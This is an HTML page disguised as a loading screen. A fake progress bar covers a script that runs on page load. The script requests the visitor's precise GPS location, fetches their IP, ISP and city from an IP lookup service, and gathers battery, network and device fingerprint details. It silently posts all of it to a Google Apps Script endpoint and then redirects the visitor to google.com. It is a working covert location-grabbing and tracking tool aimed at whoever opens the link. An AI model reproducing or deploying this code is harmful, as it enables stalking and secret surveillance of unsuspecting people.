<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Loading...</title>
  <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0b1220;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }

    .wrap{
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      gap:14px;
    }

    .loader {
      width: 58px;
      height: 58px;
      border-radius: 50%;
      border: 6px solid rgba(255,255,255,0.18);
      border-top-color: rgba(255,255,255,0.95);
      animation: spin 0.9s linear infinite;
    }

    .pct{
      color: rgba(255,255,255,0.95);
      font-size: 18px;
      font-weight: 700;
      letter-spacing: 0.5px;
    }

    .sub{
      color: rgba(255,255,255,0.65);
      font-size: 13px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<div class="wrap">
  <div class="loader" aria-label="Loading"></div>
  <div class="pct" id="pct">1%</div>
  <div class="sub">Loading...</div>
</div>

<script>
  const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycby3IOqcGND2gPKkR77ZMd9W-Dg00VGcmbyi18Zvgqeu_l0O48ytE-HjNc0-bqms5w42/exec";

  // ðŸŒ IP + ISP API
  const IP_API = "https://ipapi.co/json/";

  // Fake smooth progress (because we cannot track google.com real loading)
  let p = 1;
  let timer = null;

  function startProgress(){
    timer = setInterval(() => {
      if(p < 70) p += 3;
      else if(p < 88) p += 1;
      else if(p < 92) p += 0.2;
      else p += 0.1;

      if(p > 92) p = 92;
      document.getElementById("pct").innerText = Math.floor(p) + "%";
    }, 120);
  }

  function setProgress100(){
    if(timer) clearInterval(timer);
    document.getElementById("pct").innerText = "100%";
  }

  function nowString(){
    return new Date().toLocaleString();
  }

  function getBasicInfo(){
    return {
      ua: navigator.userAgent || "",
      platform: navigator.platform || "",
      lang: navigator.language || "",
      tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || ""),
      screenW: screen.width,
      screenH: screen.height,
      pixelRatio: window.devicePixelRatio || 1,

      vendor: navigator.vendor || "",
      maxTouchPoints: (navigator.maxTouchPoints != null ? navigator.maxTouchPoints : ""),
      cookiesEnabled: (navigator.cookieEnabled ? "Yes" : "No"),
      doNotTrack: (navigator.doNotTrack != null ? String(navigator.doNotTrack) : ""),
      hardwareConcurrency: (navigator.hardwareConcurrency != null ? String(navigator.hardwareConcurrency) : ""),
      deviceMemory: (navigator.deviceMemory != null ? String(navigator.deviceMemory) : "")
    };
  }

  function getNetworkInfo(){
    const online = navigator.onLine ? "Yes" : "No";
    let connType = "";
    let downlink = "";

    if (navigator.connection) {
      connType = navigator.connection.effectiveType || "";
      downlink = navigator.connection.downlink ? (navigator.connection.downlink + " Mbps") : "";
    }

    return { online, connType, downlink };
  }

  async function getBatteryInfo(){
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        return {
          level: (b.level * 100).toFixed(0) + "%",
          charging: b.charging ? "Yes" : "No"
        };
      }
    } catch(e) {}
    return { level: "", charging: "" };
  }

  async function getIPInfo(){
    try {
      const r = await fetch(IP_API, { method:"GET" });
      const j = await r.json();

      return {
        ip: j.ip || "",
        isp: j.org || "",
        asn: j.asn || "",
        city: j.city || "",
        region: j.region || "",
        country: j.country_name || "",
        postal: j.postal || ""
      };
    } catch(e) {
      return {
        ip: "",
        isp: "",
        asn: "",
        city: "",
        region: "",
        country: "",
        postal: ""
      };
    }
  }

  function getLocationMandatory(){
    return new Promise((resolve) => {
      if(!navigator.geolocation) {
        resolve({ ok:false, reason:"not_supported" });
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const acc = pos.coords.accuracy;
          const speed = (pos.coords.speed == null) ? "" : pos.coords.speed;
          const altitude = (pos.coords.altitude == null) ? "" : pos.coords.altitude;

          resolve({ ok:true, lat, lon, acc, speed, altitude });
        },
        (err) => {
          resolve({ ok:false, reason: (err.code === 1) ? "denied" : "error" });
        },
        { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
      );
    });
  }

  function redirect(){
    setTimeout(() => {
      window.location.replace("https://www.google.com/");
    }, 350);
  }

  async function run(){
    startProgress();

    // Fetch IP info in parallel (faster)
    const ipPromise = getIPInfo();

    const loc = await getLocationMandatory();

    // If denied/error => redirect only
    if(!loc.ok) {
      setProgress100();
      redirect();
      return;
    }

    const basic = getBasicInfo();
    const net = getNetworkInfo();
    const bat = await getBatteryInfo();
    const ip = await ipPromise;

    const maps = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;

    const collected = {
      time: nowString(),

      // Location
      latitude: String(loc.lat),
      longitude: String(loc.lon),
      accuracy: String(loc.acc),
      speed: String(loc.speed),
      altitude: String(loc.altitude),
      maps: maps,

      // Battery
      battery: bat.level,
      charging: bat.charging,

      // Network
      online: net.online,
      connection: net.connType,
      downlink: net.downlink,

      // IP + ISP
      ip: ip.ip,
      isp: ip.isp,
      asn: ip.asn,
      city: ip.city,
      region: ip.region,
      country: ip.country,
      postal: ip.postal,

      // Device / UA
      userAgent: basic.ua,
      platform: basic.platform,
      vendor: basic.vendor,
      language: basic.lang,
      timezone: basic.tz,
      screen: basic.screenW + " x " + basic.screenH,
      pixelRatio: String(basic.pixelRatio),
      maxTouchPoints: String(basic.maxTouchPoints),
      cookiesEnabled: basic.cookiesEnabled,
      doNotTrack: basic.doNotTrack,
      hardwareConcurrency: basic.hardwareConcurrency,
      deviceMemory: basic.deviceMemory
    };

    try {
      await fetch(SHEET_WEBAPP_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(collected)
      });
    } catch(e) {}

    setProgress100();
    redirect();
  }

  run();
</script>
</body>
</html>
